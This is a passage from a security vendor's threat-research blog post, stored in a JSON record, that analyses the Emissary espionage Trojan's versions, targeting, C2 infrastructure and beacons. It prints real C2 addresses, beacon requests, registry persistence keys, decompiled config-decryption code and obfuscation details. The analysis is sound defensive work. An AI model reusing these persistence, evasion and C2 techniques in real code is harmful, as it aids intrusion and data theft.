{
    "id": "ca22125c-2ee1-4cb4-b727-8dfa6eb1f761",
    "created_at": "2022-10-25T16:48:14.541817Z",
    "updated_at": "2025-03-27T02:13:48.6785Z",
    "deleted_at": null,
    "sha1_hash": "31c81ceafb1de9c731e7e003e3a638b9841a78e4",
    "title": "Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It To Evolve",
    "authors": "Palo Alto",
    "file_creation_date": "2016-02-08T23:31:31Z",
    "file_modification_date": "2016-02-08T23:31:31Z",
    "file_size": 679888,
    "plain_text": "# Emissary Trojan Changelog: Did Operation Lotus Blossom Cause It to Evolve? ­ Palo Alto Networks Blog\n\nposted by: [Robert Falcone and Jen Miller­Osborn on February 3, 2016 11:00 AM](http://researchcenter.paloaltonetworks.com/author/robert-falcone/)\n\n[In December 2015, Unit 42 published a blog about a cyber espionage attack using the Emissary](http://researchcenter.paloaltonetworks.com/2015/12/attack-on-french-diplomat-linked-to-operation-lotus-blossom/)\n\n[Trojan as a payload. Emissary is related to the Elise Trojan and the Operation Lotus Blossom attack](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\n\ncampaign, which prompted us to start collecting additional samples of Emissary.\n\nThe oldest sample we found was created in 2009, indicating this tool has been in use for almost\n\nseven years. Of note, this is three years earlier than the oldest Elise sample we have found,\n\nsuggesting this group has been active longer than previously documented. In addition, Emissary\n\nappears to only be used against Taiwanese or Hong Kong based targets, all of the decoys are written\n\nin Traditional Chinese, and they use themes related to the government or military.\n\nWe also found several different versions of Emissary that had several iterative changes that show\n\nhow the Trojan evolved over the years. One of the most interesting observations made during this\n\nanalysis is that the amount of development effort devoted to Emissary significantly increased after we\n\n[published our Operation Lotus Blossom report in June 2015, resulting in many new versions of the](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\n\nEmissary Trojan. In addition, we observed a TTP shift post publication with regards to their malware\n\ndelivery; they started using compromised but legitimate domains to serve their malware. Interestingly,\n\nthe C2 infrastructure is also somewhat different than that used by Elise.\n\n## Targeting\n\nIn contrast to Elise, which was used in attacks against multiple Southeast Asian countries in region\n\nappropriate languages, all of the Emissary decoys we’ve collected are written in Traditional Chinese,\n\nwhich is used primarily in Taiwan and Hong Kong. The targets we have identified are also limited to\n\nthose two regions. Despite appearing to target a more limited geographical range, Emissary targeted\n\nthe government, higher education, and high tech companies with a mix of copy and pasted news\n\narticles and documents that do not appear to be available online. Decoys include:\n\nAn Excel spreadsheet containing legitimate contact information for much of the Taiwanese\n\ngovernment that does not appear to be available online.\n\nCopy and paste of a news article where the Deputy Commander of the Nanjing Military region,\n\nWang Huanguang, responds negatively to a 2014 magazine article from a respected US Taiwan\n\nscholar saying the odds of China and Taiwan reuniting is low and discussing the issues with an\n\nattempted military takeover.\n\nCopy of a news article from 2010 about the Chinese League of Victims protesting the involuntary\n\nremoval of Shanghai residents in the lead up to the Shanghai Expo.\n\nCopy of the official Taiwan holiday schedule for 2016 which is the 105th anniversary of the current\n\n\n-----\n\nFigure 1: Partial screenshot of the response from Deputy Commander of the Nanjing Military Region\n\nWang Huangguang.\n\n## Evolve to Survive: TTP Shifts and Infrastructure\n\nWe’ve expanded our knowledge of Emissary infrastructure significantly since our first Emissary blog\n\nand we’ve found almost exclusive use of Dynamic DNS (DDNS) domains with only one purchased\n\nfrom a Chinese reseller. In contrast, the Elise samples used a mix of actor­registered and DDNS, with\n\nthe actor­registered serving as one of the data points we used to tie all of the activity together. While\n\nthe use of DDNS can make tying activity together more difficult, and despite the new Emissary\n\nvariants since our publication, two of the most recent C2s resolved to IPs used by Elise C2s detailed\n\nin Operation Lotus Blossom. The Emissary samples typically have three hardcoded C2s that are a\n\nmix of IPs and domain names, with one of the domains or IPs not being used by the other three C2s\n\nin a likely effort to avoid loss of control. A full IOC list is included at the end of this report.\n\nAlso new is the actors’ use of compromised legitimate Taiwanese websites to serve their malware,\n\nincluding the official website of the Democratic Progressive Party. This is particularly interesting as\n\nTaiwan just held a closely watched Presidential election on 16 January where DPP candidate Tsai\n\nIng­wen won. This marked the first time a woman was elected President of Taiwan and only the\n\nsecond time a member of the Kuomintang did not hold the office since being ousted from China in\n\n1949 when the Communist Party of China took power. In line with her party’s stance, she is widely\n\nseen as a proponent of an independent Taiwan and not in favor of reunification with the People’s\n\nRepublic of China\n\n\n-----\n\nOur evidence suggests that malware authors created Emissary as early as 2009, which suggests that\n\nthreat actors have relied on this tool as a payload in cyber­espionage attacks for many years. The\n\nEmissary Trojan is a capable tool to gain a foothold on a targeted system. While it lacks more\n\nadvanced functionality like screen capturing, it is still able to carry out most tasks desired by threat\n\nactors: exfiltration of files, ability to download and execute additional payloads, and gain remote shell\n\naccess. It appears that threat actors have continually used this Trojan, and developed several\n\nupdated versions of Emissary to remain undetected and fresh over time.\n\nWe analyzed all of the known Emissary samples to determine what changes the malware author\n\nmade between the different versions of the Trojan. During our analysis, we examined when each\n\nsample was created based on its compile time and produced a simple timeline, seen in Figure 2, to\n\ndisplay the development efforts expended on the Emissary Trojan. It should be noted that we know\n\nsome Emissary samples have been used multiple times with different configurations, so the timeline\n\nonly shows when development activity took place on Emissary and should not be misconstrued to\n\nwhen Emissary was used in attacks.\n\nThe timeline in Figure 2 shows that the Emissary Trojan was first created (version 1.0) in May 2009\n\nand quickly received an update that resulted in version 1.1 in June 2009. The Trojan did not receive\n\nmuch in the form of updates until September 2011 when the author released version 2.0. Version 2.0\n\nreceived one update in October 2013 before the malware author released version 3.0 in December\n\n2014. The malware author released version 4.0 in March 2015, but curiously created a version 3.0\n\nsample afterwards on June 26, 2015, which was out­of­sequence from the incrementing versioning.\n\nBetween August and November 2015 the malware author creates several new versions of Emissary,\n\nspecifically 5.0, 5.1, 5.3 and 5.4 in a much more rapid succession compared to development process\n\nin earlier versions.\n\n\n-----\n\n-----\n\n-----\n\nFigure 2: Timeline of development efforts spent on Emissary\n\nThe out­of­sequence version 3.0 appears to be an early variant of version 5.0 based on significant\n\nsimilarities (discussed in the changelog section) that are not seen in the original version 3.0 and other\n\nearlier versions of Emissary. One campaign code associated with of the out­of­sequence version 3.0\n\nsample was “3test”, suggesting the malware author created it for testing purposes. The other\n\ncampaign code associated with the out­of­sequence sample was “IC00001”, which could denote an\n\nattack payload as it appears to be a plausible code to describe a campaign.\n\nWhile this may be coincidental, the out­of­sequence version 3.0 sample was created ten days after\n\n[we published the Operation Lotus Blossom paper that exposed the Elise Trojan that is closely related](http://researchcenter.paloaltonetworks.com/2015/06/operation-lotus-blossom/)\n\nto Emissary. It is possible that the threat actors were prompted to make malware changes in\n\nresponse to our research. Regardless of causation, the rapid development of new versions of\n\nEmissary suggests that the malware authors are making frequent modifications to evade detection,\n\nwhich as a corollary suggests the threat actors are actively using the Emissary Trojan as a payload in\n\nattacks.\n\n## Emissary Changelog\n\nIn this section, we discuss the changes observed between each version of Emissary. As this section\n\nis focused on changes, the features and functionality are the same between Emissary versions\n\nunless otherwise mentioned.\n\n**Version 1.0**\n\n**Date: 5/12/2009**\n\nSHA256: a7d07b92e48876e2195e5d8769a47cf0a237e11ac304e41b14fc36042b0d9484 Original\n\nName: WUMsvc.dll\n\n**Initial Release**\n\nThe initial loader Trojan writes Emissary to %SYSTEM%\\WSPsvc.dll and installs it as a service, which\n\nwill run the exported function “ServiceMain” within the Emissary Trojan to carry out its functionality.\n\nConfiguration data is stored in the last 1024 bytes of the payload, from which the Trojan will extract\n\nan 896 byte structure. The configuration is decrypted with an algorithm that uses the XOR operation\n\non each byte using the value at a different offset within the ciphertext.\n\n\n-----\n\n1\n\n2\n\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckCode\n\nHKEY_CLASSES_ROOT\\Shell.LocalServer\\CheckID\n\nEmissary uses the “CheckCode” registry key to store the encrypted configuration for the Trojan, while\n\nit stores a GUID that Emissary uses to uniquely identify the compromised host in the “CheckID” key.\n\nThe malware performs initial system information gathering and saves data to a file named TMP2548.\n\nThe initial gathering relies on a combination of the following commands executed by the command\n\nprompt:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\ncommands executed by the command prompt:\n\nECHO VER\n\nVER\n\nECHO IPCONFIG /ALL\n\nIPCONFIG /ALL\n\nECHO NET LOCALGROUP ADMINISTRATORS\n\nNET LOCALGROUP ADMINISTRATORS\n\nECHO NET START\n\nNET START\n\nECHO GPRESULT /Z\n\nGPRESULT /Z\n\nECHO GPRESULT         /SCOPE COMPUTER /Z\n\nGPRESULT           /SCOPE COMPUTER /Z\n\nECHO SYSTEMINFO\n\n\n-----\n\nEmissary parses command and control responses for “instru”, which will precede a GUID value that\n\ndesignates the command the C2 server wishes to execute on the system. The command handler\n\ndoes not use a nested if/else or switch statement like most malware families, instead Emissary\n\ncreates a structure that contains all of the available command GUIDs that it will iterate through each\n\ntime the C2 supplies a GUID in order to determine which command the operator wishes to execute.\n\nEmissary can include up to 32 different commands within this data structure, but it appears the\n\nauthor has decided to include six commands within the Trojan. The following denotes the command\n\nhandler structure used by Emissary v1.0:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n**CommandDescriptiondb0e93e7­b46c­4cba­81f1­ec70da57dc19Update config. C2 specifies files as:**\n\np1 = C2 server 1, p2 = C2 server 2, p3 = C2 server 3, p4 = Sleep Interval, p5 = System Identifier\n\n(computer name), p6 = GUID for beacon.2e382e51­3089­4293­8454­5eccb253eb54Executes a\n\nspecified command.\n\nTable 1: Emissary command handler\n\nThe Emissary version 1.0 beacon to the C2 server appears as follows:\n\n1\n\n2\n\n3\n\n4\n\nGET /VSNET/default aspx HTTP/1 1\n\n\n-----\n\nHost: 193.34.144[.]21\n\nCookie: guid=af44f802­ba5c­4b3c­8c6b­2ea411058678; op=1635b097­ffe4­4711­89e6­7f8c7f4cdca6\n\n**Date: 5/31/2009**\n\nSHA256: e6c4611b1399ada920730686395d6fc1700fc39add3d0d40b4f784ccb6ad0c30, Original\n\nName: WUMsvc.dll\n\nRemoved checks for “//” and “/” in the update configuration command when updating the three C2\n\nservers.\n\n**Version 1.1**\n\n**Date: 6/5/2009**\n\nSHA256: 931a1284b11a3997c7a99076d582ed3436aa30409dc73bd763436dddd490f9cb\n\nOriginal Name: WUMsvc.dll\n\nBug fixes:\n\nAdded code to make sure the content received from the C2 server matches the “Content­Length”\n\nvalue in the HTTP response.\n\nCode added to allow for the download of more than 524,288 bytes.\n\nThe Emissary v1.1 C2 beacon appears as follows, which has not changed since version 1.0:\n\n1\n\n2\n\n3\n\n4\n\nGET /eng/comfunc/comfunc/default.aspx HTTP/1.1\n\nUser­Agent: Mozilla/4.0\n\nHost: 137.189.145.1\n\nCookie: guid=af44f802­ba5c­4b3c­8c6b­2ea411058678; op=1635b097­ffe4­4711­89e6­7f8c7f4cdca6\n\n**Version 2.0**\n\n**Date: 9/15/2011**\n\nSHA256: 5edf2d0270f8e7eb5be3476802e46c578c4afc4b046411be0806b9acc3bfa099 Original\n\nName: EmissaryDll.dll\n\nVersion 2.0 was a significant re­write of the Emissary Trojan.\n\nThe configuration data for the Trojan is still saved to the registry, but the registry key has changed to:\n\n1\n\nSOFTWARE\\Microsoft\\VBA\\VbaData\n\n\n-----\n\nvalue of 2563. This seed value causes the “rand” function to generate the same values each time,\n\nwhich Emissary will use as a key along with the XOR operation. The configuration now contains the\n\nversion number of Emissary, instead of the version being hardcoded into the Trojan.\n\nThis version of Emissary keeps track of which C2 location within its configuration that it has been\n\ncommunicating with by storing the index of the C2 server (1, 2, or 3) in the following registry key:\n\n1\n\nSOFTWARE\\Microsoft\\VBA\\VbaList\n\nThis version of Emissary moves away from the command handler using the structure and moves to a\n\nnested if/else statement for less complicated command handling; however, the command GUID and\n\ncommands themselves are unchanged.\n\nThe Emissary version 2.0 beacon changed slightly from previous versions, specifically the removal of\n\nthe User­Agent field and the use of a lowercase “h” in the “Host” field. The following is an example of\n\nthe version 2.0 beacon, which contains the same GUID and “op” values:\n\n1\n\n2\n\n3\n\nGET /0test/test/default.aspx HTTP/1.1\n\nhost: 163.20.127.27\n\nCookie: guid=af44f802­ba5c­4b3c­8c6b­2ea411058678; op=1635b097­ffe4­4711­89e6­\n\n7f8c7f4cdca6;\n\nVersion 2.0 also introduces a debug message logging system that includes verbose error messages\n\nthat are accompanied by an error ID number. Error messages are written to the file\n\n%TEMP%\\em.log. The following is a list of all possible debug messages:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n\n-----\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n38\n\n39\n\n40\n\n41\n\n42\n\n43\n\n44\n\n45\n\n46\n\n47\n\n48\n\n49\n\n50\n\n51\n\n52\n\n53\n\n54\n\n55\n\n56\n\n57\n\n\n-----\n\n59\n\n60\n\n61\n\n62\n\n63\n\n64\n\nSource ­ Error ID ­ Debug Message\n\nemissarydll.cpp ­ 0x30 ­ InitApp() ­ Event already exists\n\nemissarydll.cpp ­ 0x35 ­ InitApp() ­ Event create successful\n\nemissarydll.cpp ­ 0x3b ­ InitApp() ­ create work thread\n\nshell.cpp ­ 0x30 ­ SendShellOutputThread ­ PeekNamedPipe ­ Error : 0x%08x\n\nshell.cpp ­ 0x3e ­ SendShellOutputThread() : Timeout\n\nshell.cpp ­ 0x53 ­ SendShellOutputThread ­ ReadFile ­ Error : 0x%08x\n\nshell.cpp ­ 0x5b ­ SendShellOutputThread ­ send ­ Error : 0x%08x\n\nshell.cpp ­ 0x62 ­ SendShellOutputThread() : thread exit\n\nshell.cpp ­ 0x7f ­ RecvShellCmdThread ­ recv ­ Error : 0x%08x\n\nshell.cpp ­ 0x89 ­ RecvShellCmdThread ­ WriteFile ­ Error : 0x%08x\n\nshell.cpp ­ 0x8f ­ RecvShellCmdThread() : thread exit\n\nshell.cpp ­ 0xeb ­ Error occured : %s [%d]\n\nshell.cpp ­ 0xfa ­ TerminateThread Input Thread\n\nshell.cpp ­ 0x100 ­ TerminateThread Output Thread\n\nshell.cpp ­ 0x118 ­ SocketShell ­ Fail To Create Reverse Socket\n\nshell.cpp ­ 0x12f ­ SocketShell ­ Fail To Generate Reverse Shell\n\nshell.cpp ­ 0x13a ­ SocketShell ­ SocketShell ­ Fail To Generate Reverse Shell\n\nshell.cpp ­ 0x13e ­ SocketShell ­ Create Reverse Shell Thread OK\n\nconfig.cpp ­ 0x38 ­ RegCreateKeyEx error : %0x08x\n\nconfig.cpp ­ 0x46 ­ RegSetValueEx error : %0x08x\n\nconfig.cpp ­ 0x5e ­ ReadConfig ­ RegCreateKeyEx error : 0x%08x\n\nconfig.cpp ­ 0x66 ­ ReadConfig ­ RegQueryValueEx error : 0x%08x\n\nconfig.cpp ­ 0xab ­ find user: %s\n\nconfig.cpp ­ 0xbc ­ can not find proxy\n\nconfig.cpp ­ 0xc7 ­ get ProxySetting failed\n\nconfig.cpp ­ 0xd4 ­ find proxy server : %s\n\nrun.cpp ­   0x75 ­ InitConfig: [g_ServerPath:%s] [g_ServerName:%s] [g_port:%d] [g_ServerUrl:%s]\n\nrun.cpp ­ 0x9d ­ InitConfig: [g_DelayTime:%d]\n\nrun.cpp ­ 0xbe ­ get proxy the last time used:%s\n\nrun.cpp ­ 0xc3 ­ server index:%d\n\nrun.cpp ­ 0xd9 ­ RetryTimes = %d\n\nrun.cpp ­ 0xec ­ connect %s error :%s\n\nrun.cpp ­ 0x10c ­ process a request ok.\n\nhttpclient cpp 0x98 ASP NET SessionId长度异常:[%d][%s] (translation: ASP NET SessionId\n\n\n-----\n\nhttpclient.cpp ­ 0xd0 ­ ******not connected !\n\nhttpclient.cpp ­ 0xf4 ­ read hread error : %s\n\nhttpclient.cpp ­ 0x102 ­ body length = 0\n\nhttpclient.cpp ­ 0x13d ­ decrypt error\"\n\nhttpclient.cpp ­ 0x211 ­ instruction : <instruction>\n\nhttpclient.cpp ­ 0x21d ­ no instruction guid\n\nhttpclient.cpp ­ 0x22c ­ OP_DOWNLOAD no local file name\n\nhttpclient.cpp ­ 0x23b ­ OP_UPLoad no local file name\n\nhttpclient.cpp ­ 0x249 ­ OP_UPLoad no local file name\n\nhttpclient.cpp ­ 0x242 ­ OP_UPLoad no local file name\n\nhttpclient.cpp ­ 0x25b ­ OP_EXECUTE no cmd list\n\nhttpclient.cpp ­ 0x262 ­ OP_EXECUTE no timeout\n\nhttpclient.cpp ­ 0x2b4 ­ OP_SHELL ip\n\nhttpclient.cpp ­ 0x2bb ­ OP_SHELL port\n\nhttpclient.cpp ­ 0x2dd ­ OP_CHANGECONFIG server1\n\nhttpclient.cpp ­ 0x2e4 ­ OP_CHANGECONFIG server2\n\nhttpclient.cpp ­ 0x2eb ­ OP_CHANGECONFIG server3\n\nhttpclient.cpp ­ 0x2f2 ­ OP_CHANGECONFIG timestr\n\nhttpclient.cpp ­ 0x2f9 ­ OP_CHANGECONFIG namestr\n\nhttpclient.cpp ­ 0x300 ­ OP_CHANGECONFIG guid\n\nhttpclient.cpp ­ 0x321 ­ not connected\n\nhttpclient.cpp ­ 0x361 ­ send msg error\n\nhttpdoinstruction.cpp ­ 0x28 ­ DownloadFile ­ LocalFileName=%s\n\nhttpdoinstruction.cpp ­ 0x5c ­ download file http head:%s\n\nhttpdoinstruction.cpp ­ 0x7a ­ download file ok\n\nhttpdoinstruction.cpp ­ 0xac ­ UploadFile ­ LocalFileName=%s\n\nhttpdoinstruction.cpp ­ 0xb4 ­ DownloadFile ­ Error ­ Open File [%S][0x%08x]\n\nhttpdoinstruction.cpp ­ 0xc7 ­ UploadFile:TotalLength=%d\n\nhttpdoinstruction.cpp ­ 0x124 ­ download file http head:%s\n\n**Date: 10/24/2013**\n\nSHA256: 9dab2d1b16eb0fb4ec2095d4b4e2a3ad67a707ab4f54f9c26539619691f103f3\n\nOriginal Name: NetPigeon_DLL.dll\n\nThis update to Emissary allowed the Trojan to run as a service. The configuration now contains\n\nsettings for the Emissary service, which the Trojan will store in and access from the following registry\n\nkeys:\n\nSOFTWARE\\Microsoft\\VBA\\Serv ­> Service Name\n\nSOFTWARE\\Microsoft\\VBA\\VbaList ­> Binary Path for the Service\n\n\n-----\n\nversions, this version uses the MFC functions to create the HTTP request and send it to the C2\n\nserver:\n\nCInternetSession::CInternetSession\n\nCInternetSession::GetHttpConnection\n\nCHttpConnection::OpenRequest\n\nCHttpFile::AddRequestHeaders\n\nCInternetSession::SetCookie\n\nCHttpFile::SendRequest\n\nUsing these classes creates a significantly different HTTP request sent to the C2 server, but the\n\nfunctionality of obtaining instructions from the C2 is the same. The following is an example of a\n\nbeacon generated by this sample, which contains the same “op” value and has additional fields within\n\nthe HTTP header:\n\n1\n\n2\n\n3\n\n4\n\n5\n\nGET /lightserver/Default.aspx HTTP/1.0\n\nCache­Control: no­cache\n\nUser­Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\n\nHost: groupspace.findhere.org\n\nCookie: guid=8E550BBD­F5DB­4471­BBC7­E8768BD5003E; op=1635b097­ffe4­4711­89e6­\n\n7f8c7f4cdca6\n\nThe logging functionality within this update no longer includes error ID values, but still contains\n\nverbose debug messages that are written to a file named %TEMP%\\msmqinst.ax.\n\n**Version 3.0**\n\n**Date: 12/24/2014**\n\nSHA256: dcbeca8c92d6d18f2faf385e677913dc8abac3fa3303c1f5cfe166180cffbed3\n\nOriginal Name: Generic.dll\n\nBug fixes:\n\nAdded a function to the configuration update command that checks to see if the C2 provided a\n\nnew sleep interval at offset 460 and uses the interval stored in the VbaData registry key if its\n\nmissing. This fixes the bug that would not allow the sleep interval to update correctly.\n\n**Version 4.0**\n\n\n-----\n\nOriginal Name: Generic.dll\n\nThis version of Emissary includes both the installation and loading functionality along with the\n\nEmissary functional code in the same file. The installation and loading portion of the Trojan is called\n\nusing an exported function named “Setting”, which moves the file to:\n\n1\n\n%TEMP%\\Remdisk.dll\n\nThe loading portion of this version of Emissary checks the permissions of the current user and either\n\ninstalls Emissary as a service or as a standalone Trojan. To install as a service, the loader will\n\nenumerate the services on the system looking for services running under the “netsvcs” group, and it\n\nwill attempt to hijack the first “netsvcs” service by replacing the “ServiceDLL” parameter to point to\n\nthe Emissary DLL. For instance, during the analysis period, the installation code changed the\n\nfollowing registry key of the AppMgmt:\n\n1\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll:\n\n\"%SystemRoot%\\System32\\appmgmts.dll\"\n\nto\n\n1\n\nHKLM\\SYSTEM\\CurrentControlSet\\Services\\AppMgmt\\Parameters\\ServiceDll:\n\n\"C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll\"\n\nIf the user does not have permissions to add a service, the installation routine attempts to add\n\npersistence by creating the following registry key that will run the functional code within Emissary via\n\nan exported function named “DllRegister”:\n\n1\n\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run\\Resolves: \"Rundll32.exe\n\nC:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Remdisk.dll,DllRegister\"\n\nThis version of emissary has its configuration appended to the end of the DLL, specifically starting at\n\noffset 0xc600. The following code accesses the configuration embedded within the DLL and decrypts\n\nit using a single byte XOR algorithm using 65 as the key:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\nSetFilePointer(v2, 0xC600, 0, 0);\n\nReadFile(h emissary dll file buffer for config 0x1D0u &NumberOfBytesRead 0);\n\n\n-----\n\ndo\n\n*(iteration_count++ + buffer_for_config) += 65;\n\nwhile ( iteration_count < 0x1D0 );\n\nThis algorithm differs from the algorithm introduced in Emissary version 2.0 that used the srand and\n\nrand functions to generate a key to use in conjunction with the XOR operation. With the configuration\n\nembedded within the Emissary DLL, each Emissary version 4.0 sample will have a different hash as\n\nthe configuration data changes.\n\nThe network beacon sent from Emissary version 4.0 is the same as other previous versions starting\n\nat version 2.0, as seen in the following:\n\n1\n\n2\n\n3\n\n4\n\n5\n\nGET /lightserver/Default.aspx HTTP/1.0\n\nCache­Control: no­cache\n\nUser­Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\n\nHost: 210.209.121.92\n\nCookie: guid=7DA53AE4­C155­40b3­8EB3­60C4FCE99025; op=1635b097­ffe4­4711­89e6­\n\n7f8c7f4cdca6\n\n**Version 3.0: Out­of­sequence**\n\n**Date: 6/25/2015**\n\nSHA256: 70bed57bc3484fe5dbcf3c732bd7b11f80a742138f4733bc7e9b6d03e721da4a\n\nOriginal Name: IISDLL.dll\n\n**Major Overhaul**\n\nThe compilation time of one sample of Emissary version 3.0 on June 25, 2015 appears out of order,\n\nas it occurs after the compilation of Emissary version 4.0. The differences between this out of order\n\nsample compared to the other known version 3.0 sample, as well as version 4.0 for that matter,\n\ninclude a dramatic change in configuration storage and the handling of commands. Also, the files\n\nstored on the system have different names than Emissary versions in the past, which are:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n%TEMP%\\000IISA758C8FEAE5F.TMP ­> Log file\n\n\n-----\n\nThis version of Emissary is designed to be injected into an Internet Explorer process by its associated\n\nloader Trojan, which marks the first time Emissary executes through DLL injection.\n\nThis version of Emissary also has a different configuration structure than prior versions. The\n\nconfiguration is no longer stored in the registry; rather it is saved to a file named 75BD50EC.DAT.\n\nThe Emissary DLL will skip to offset 0x488 within this file and read the next 132 bytes, which it will\n\ndecrypt with a new algorithm as seen in the following:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\nSetFilePointer(h_config_file_1, 0x488, 0, 0);\n\nReadFile(h_config_file, buffer_for_config, 132u, &NumberOfBytesRead, 0);\n\nCloseHandle(h_config_file);\n\nsrand(0xA03u);\n\niteration_count = 0;\n\ndo\n\n*(buffer_for_config + iteration_count++) ^= rand() % 128;\n\nwhile ( iteration_count < 0x84 );\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\nstruct emissary_new_config {\n\nWORD Emissary_version_major;\n\nWORD Emissary_version_minor;\n\nCHAR[36] GUID_for_sample;\n\nWORD Unknown1;\n\n\n-----\n\nCHAR[128] Server3;\n\nCHAR[128] CampaignName;\n\nCHAR[550] Unknown2;\n\nWORD Delay_interval_seconds;\n\n};\n\nThis version of Emissary also introduced a new command handler that uses number­based\n\ncommands instead of the GUID commands seen in prior versions of Emissary. The functionality of\n\nthe commands are the same, however, the commands themselves are invoked using a number.\n\nTable 2 contains a list of available commands and a brief description of the functionality carried out\n\nby the command.\n\n**Command** **Description**\n\n102 Upload a file to the C2 server.\n\n103 Executes a specified command.\n\n104 Download file from the C2 server.\n\n105 Update configuration file.\n\n106 Create a remote shell.\n\n107 Updates the Trojan with a new executable.\n\nTable 2: New Emissary command handler\n\nThe network beacon sent from this version of Emissary is very similar to the beacon first introduced\n\nin Emissary version 2.0; however, the “op” value of “101” is hardcoded for the beacon and replaces\n\nthe GUID based op designator to match the new command handler. The following is an example of\n\nthe network beacon generated by this version of Emissary:\n\n1\n\n2\n\n3\n\n4\n\n5\n\nGET /default.aspx HTTP/1.1\n\nUser­Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\n\nHost: 101.55.33.92\n\nCache­Control: no­cache\n\nCookie: guid=cae5e213­395a­4023­9a12­f78d3c4718e5; op=101\n\n**Version 5.0**\n\n\n-----\n\nSHA256: c145bb2e4ce77c79aa01de2aec4a8b5b0b680e23bceda2c230903b5f0e119634, Original\n\nName: WinDLL.dll\n\nEmissary version 5.0 closely resembles the out­of­order version 3.0 sample, which suggests that the\n\nmalware author just forgot to change the version number of the out of order sample. While the\n\nconfiguration and Emissary DLL filenames used by the version 5.0 Emissary sample are the same as\n\nthe out­of­order version 3.0 sample, the log file name differs but only slightly, as seen in the following\n\nlist of related files:\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n%TEMP%\\000A758C8FEAE5F.TMP ­> Log File\n\n%APPDATA%\\LocalData\\75BD50EC.DAT ­> Configuration file\n\n%APPDATA%\\LocalData\\A08E81B411.DAT ­> Emissary DLL\n\n%APPDATA%\\LocalData\\ishelp.dll ­> Loader DLL\n\nVersion 5.0 uses numbers within its command handler and the same configuration structure as the\n\nout­of­order version 3.0. The only major change in 5.0 is the ability to obtain a compromised system’s\n\nexternal IP address by performing an HTTP GET request to “http://showip.net/index.php”. The code\n\nwill parse the response from this webserver for the following to obtain the system’s IP address:\n\n1\n\n<input id=\"checkip\" type=\"text\" name=\"check_ip\" value=\"[IP address parsed]\" />\n\nThe SID value sent from the C2 server is encrypted using an algorithm that uses the XOR operation\n\non the data using 0x76 as the key on the first byte and the resulting cleartext byte as the key on the\n\nnext byte and so on. The network beacon sent from this version of Emissary visually resembles the\n\nout­of­order version, with the addition of a field “SHO” that contains the IP address of the\n\ncompromised host. The following is an example of the Emissary version 5.0 network beacon, which is\n\nalso the same in versions 5.1, 5.3 and 5.4 as well:\n\n1\n\n2\n\n3\n\n4\n\n5\n\nGET /default.aspx HTTP/1.1\n\nUser­Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\n\nHost: 101.55.33.95\n\n\n-----\n\nCookie: guid=8cdef38c­808a­4e29­af6e­7386f02d28f1; op=101; SHO=172.16.107.130\n\n**Version 5.1**\n\n**Date: 9/29/2015**\n\nSHA256: 375190cc8e0e75cf771d66347ea2a04b6d1b59bf2f56823eb81270618f133e2d\n\nOriginal Name: WinDLL.dll\n\nFor version 5.1 the malware author took out the exception handling in the Upload File command and\n\nobfuscated two strings within the Trojan to avoid detection. The strings exist in the Trojan in\n\nencrypted form and are decrypted using an algorithm that uses addition to each byte of ciphertext,\n\nusing 65 (“A”) as a key. The obfuscated strings, as seen below, involve the filename of the log file and\n\nthe command prompt executable used to create the remote shell:\n\n1\n\n2\n\n\\xEF\\xEF\\xEF\\x00\\xF6\\xF4\\xF7\\x02\\xF7\\x05\\x04\\x00\\x04\\xF4\\x05\\xED\\x13\\x0C\\x0F =\n\n000A758C8FEAE5F.TMP\n\n\\x22\\x2C\\x23\\xED\\x24\\x37\\x24 = cmd.exe\n\n**Date: 10/14/2015**\n\nSHA256: e369417a7623d73346f6dff729e68f7e057f7f6dae7bb03d56a7510cb3bfe538\n\nOriginal Name: WinDLL.dll\n\nIn an attempt to avoid detection based on PE header hashes, version 5.1 was recompiled without\n\nmaking any changes.\n\n**Version 5.3**\n\n**Date: 11/7/2015**\n\nSHA256: 29d8dc863427c8e37b75eb738069c2172e79607acc7b65de6f8086ba36abf051\n\nOriginal Name: WinDLL.dll\n\nEmissary 5.3 moved some code used to create the remote shell out of a sub­function in an attempt to\n\nevade signatures used to detect the remote shell creation. For instance, in Emissary 5.1 the\n\ncommand handler would call an initial subfunction that would then call a second subfunction to carry\n\nout the activities to create and interact with the remote shell. In 5.3, the command handler calls an\n\ninitial subfunction that carries out the activities to create and interact with the remote shell.\n\n**Version 5.4**\n\n**Date: 11/23/2015**\n\nSHA256: 69b1d5454abe2475257defd9962a24a92411212c4f592de8765369a97f26c037 (Base DLL\n\nith j k d t d)\n\n\n-----\n\n[Version 5.4 of Emissary was the basis for the blog “ELISE: Security Through Obesity” by Michael Yip](http://pwc.blogs.com/cyber_security_updates/2015/12/elise-security-through-obesity.html)\n\nof PWC. This blog provides a great analysis of this version of Emissary and we highly suggest\n\nreading it to become familiar with the Trojan.\n\nThere is one difference in the functional code between 